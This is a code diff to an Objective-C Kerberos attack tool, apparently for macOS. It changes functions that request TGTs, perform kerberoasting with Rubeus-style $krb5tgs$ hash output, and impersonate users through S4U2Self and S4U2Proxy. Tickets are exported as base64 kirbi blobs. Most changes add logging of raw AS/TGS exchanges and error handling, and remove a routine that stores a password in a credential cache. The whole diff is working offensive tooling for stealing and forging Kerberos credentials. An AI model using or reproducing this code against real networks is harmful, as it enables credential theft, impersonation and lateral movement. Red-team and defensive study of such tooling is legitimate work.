@@ -793,14 +793,15 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
     if(lkdcip != NULL){
         result = [kerbdc connectLKDCByIP:lkdcip.UTF8String];
     }else if(connectDomain != NULL){
-        result = [kerbdc connectDomain:connectDomain.UTF8String];
+        result = [kerbdc connectDomain:connectDomain.UTF8String Output:output];
     }else{
-        result = [kerbdc connectDomain:domain.UTF8String];
+        result = [kerbdc connectDomain:domain.UTF8String Output:output];
     }
     if(result == -1){
         @throw @"[-] Failed to connect to the domain";
     }
     result = [kerbdc sendBytes:test];
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] AS-REQ: %s\n", [test base64EncodedStringWithOptions:0].UTF8String]];
     if(result == -1){
         @throw @"[-] Failed to send bytes";
     }else{
@@ -808,8 +809,9 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
         //printf("[+] Successfully sent ASREQ\n");
     }
     NSData* holder = [kerbdc recvBytes];
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] AS-REP: %s\n", [holder base64EncodedStringWithOptions:0].UTF8String]];
     if(holder == NULL){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get bytes from KDC"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get bytes from KDC\n"]];
         @throw output;
     }else{
         [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received ASREP\n"]];
@@ -823,6 +825,11 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
     }else{
         tgt = parseASREP(asrep, hash, enctype);
     }
+    if (tgt.error){
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get TGT\n"]];
+        [output appendString: tgt.error];
+        return output;
+    }
     if(tgt.app29 != NULL){
         [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
         //printf("[*] Describing ticket\n");
@@ -834,7 +841,7 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
         [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
         //printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
     }else{
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get TGT"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get TGT\n"]];
         @throw output;
     }
     return output;
@@ -854,38 +861,47 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
         serviceDomain = TGT.app1.realm.KerbGenStringvalue;
         //printf("[*] Service domain: %s\n", serviceDomain.UTF8String);
     }
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting service ticket to %s as %s\n", service.UTF8String, TGT.app29.cname.username.KerbGenStringvalue.UTF8String]];
+    //printf("[*] Requesting service ticket to %s as %s\n", service.UTF8String, TGT.app29.cname.username.KerbGenStringvalue.UTF8String);
+    
     kdc* kerbdc = [kdc alloc];
     int result;
     if(LKDCIP == NULL){
-        result = [kerbdc connectDomain:connectDomain.UTF8String];
+        result = [kerbdc connectDomain:connectDomain.UTF8String Output:output];
     }
     else{
         result = [kerbdc connectLKDCByIP:LKDCIP.UTF8String];
     }
     if(result == -1){
-        @throw @"[-] Failed to connect to domain";
+        @throw @"[-] Failed to connect to domain\n";
     }
-    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting service ticket to %s as %s\n", service.UTF8String, TGT.app29.cname.username.KerbGenStringvalue.UTF8String]];
-    //printf("[*] Requesting service ticket to %s as %s\n", service.UTF8String, TGT.app29.cname.username.KerbGenStringvalue.UTF8String);
     NSData* tgsreq = createTGSREQ(TGT, service, kerberoasting, serviceDomain);
-    //printf("%s\n", [tgsreq base64EncodedStringWithOptions:0].UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] TGS-REQ: %s\n", [tgsreq base64EncodedStringWithOptions:0].UTF8String]];
+    //printf("\nTGS-REQ: %s\n", [tgsreq base64EncodedStringWithOptions:0].UTF8String);
     result = [kerbdc sendBytes:tgsreq];
     if(result == -1){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC\n"]];
         @throw output;
     }else{
         [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent TGSREQ\n"]];
         //printf("[+] Successfully sent TGSREQ\n");
     }
     NSData* holder = [kerbdc recvBytes];
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] TGS-REP: %s\n", [holder base64EncodedStringWithOptions:0].UTF8String]];
+    //printf("\nTGS-REP: %s\n", [holder base64EncodedStringWithOptions:0].UTF8String);
     if(holder == NULL){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get bytes from KDC"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get bytes from KDC\n"]];
         @throw output;
     }else{
         [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received TGSREP\n"]];
         //printf("[+] Successfully received TGSREP\n");
     }
     Krb5Ticket sTicket = parseTGSREP(holder, TGT, kerberoasting);
+    if( sTicket.error ){
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Service Ticket from response\n"]];
+        [output appendString:sTicket.error];
+        return output;
+    }
     if(sTicket.app29 != NULL){
         if( kerberoasting){
             //From Rubeus: string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
@@ -904,7 +920,7 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
         //printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
         return output;
     }else{
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Service Ticket from response"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Service Ticket from response\n"]];
         @throw output;
     }
 }
@@ -919,23 +935,23 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
     }
     
     kdc* kerbdc = [kdc alloc];
-    int result = [kerbdc connectDomain:connectDomain.UTF8String];
+    int result = [kerbdc connectDomain:connectDomain.UTF8String Output:output];
     if(result == -1){
-        @throw @"[-] Failed to connect to KDC";
+        @throw @"[-] Failed to connect to KDC\n";
     }
     [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String]];
     //printf("[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String);
     NSData* tgsreq = createS4U2SelfReq(TGT, targetUser);
     result = [kerbdc sendBytes:tgsreq];
     if(result == -1){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC\n"]];
         @throw output;
     }else{
         [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request\n"]];
     }
     NSData* holder = [kerbdc recvBytes];
     if(holder == NULL){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC\n"]];
         @throw output;
     }else{
         [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received response\n"]];
@@ -949,7 +965,7 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
         NSData* kirbi = createKirbi(sTicket);
         [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
     }else{
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Service Ticket"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Service Ticket\n"]];
         @throw output;
     }
     //now that we have a forwardable service ticket, do the S4U2Proxy process to get the next service ticket
@@ -965,21 +981,21 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
     }
     [output appendString:[[NSString alloc] initWithFormat:@"[*] Impersonating %s to service %s@%s via S4U2Proxy\n", sTicket.app29.cname.username.KerbGenStringvalue.UTF8String, spn.UTF8String, spnDomain.UTF8String]];
     NSData* S4U2ProxyReq = createS4U2ProxyReq(TGT, spn, spnDomain, [sTicket.app1 collapseToNSData]);
-    result = [kerbdc connectDomain:connectDomain.UTF8String];
+    result = [kerbdc connectDomain:connectDomain.UTF8String Output:output];
     if(result == -1){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain\n"]];
         @throw output;
     }
     result = [kerbdc sendBytes:S4U2ProxyReq];
     if(result == -1){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC\n"]];
         @throw output;
     }else{
         [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request\n"]];
     }
     holder = [kerbdc recvBytes];
     if(holder == NULL){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC\n"]];
         @throw output;
     }else{
         [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received response\n"]];
@@ -992,7 +1008,7 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
         NSData* kirbi = createKirbi(s4uTicket);
         [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
     }else{
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse service ticket from response"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse service ticket from response\n"]];
         @throw output;
     }
     return output;
@@ -1008,23 +1024,23 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
     }
     
     kdc* kerbdc = [kdc alloc];
-    int result = [kerbdc connectDomain:connectDomain.UTF8String];
+    int result = [kerbdc connectDomain:connectDomain.UTF8String Output:output];
     if(result == -1){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain\n"]];
         @throw output;
     }
     [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String]];
     NSData* tgsreq = createS4U2SelfReq(TGT, targetUser);
     result = [kerbdc sendBytes:tgsreq];
     if(result == -1){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC\n"]];
         @throw output;
     }else{
         [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request\n"]];
     }
     NSData* holder = [kerbdc recvBytes];
     if(holder == NULL){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC\n"]];
         @throw output;
     }else{
         [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received response\n"]];
@@ -1040,7 +1056,7 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
         [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
         
     }else{
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse service ticket from response"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse service ticket from response\n"]];
         @throw output;
     }
     return output;
@@ -1050,7 +1066,7 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
     int result = [krbdc connectLKDCByIP: IP.UTF8String];
     NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if(result == -1){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain\n"]];
         @throw output;
     }
     // now to start the back-and-forth process with the LKDC at the end of the IP specified
@@ -1059,7 +1075,7 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
     //printf("Stage 1 Req: %s\n", [LKDC_Stage1_Req base64EncodedStringWithOptions:0].UTF8String);
     result = [krbdc sendBytes:LKDC_Stage1_Req];
     if(result == -1){
-        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC\n"]];
         @throw output;
     }
     else{
@@ -1154,32 +1170,6 @@ NSString* getKrbError(krb5_context context, krb5_error_code ret) {
         @throw output;
     }
     [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully imported credential\n"]];
-    return true;
-}
--(bool)storeLKDCConfDataFriendlyName:(NSString*)friendlyName Hostname:(NSString*)hostname Password:(NSString*)password CCacheName:(NSString*)cacheName{
-    bool ret;
-    //FriendlyName is the username
-    ret = [self createLKDCCACHECONFDataPrincipal:@"FriendlyName" TicketData:friendlyName CCacheName:cacheName];
-    if(!ret){
-        return false;
-    }
-    //lkdc-hostname is the remote hostname or IP
-    ret = [self createLKDCCACHECONFDataPrincipal:@"lkdc-hostname" TicketData:hostname CCacheName:cacheName];
-    if(!ret){
-        return false;
-    }
-    ret = [self createLKDCCACHECONFDataPrincipal:@"nah-created" TicketData:@"1" CCacheName:cacheName];
-    if(!ret){
-        return false;
-    }
-    ret = [self createLKDCCACHECONFDataPrincipal:@"iakerb" TicketData:@"1" CCacheName:cacheName];
-    if(!ret){
-        return false;
-    }
-    ret = [self createLKDCCACHECONFDataPrincipal:@"password" TicketData:password CCacheName:cacheName];
-    if(!ret){
-        return false;
-    }
     return true;
 }
 @end
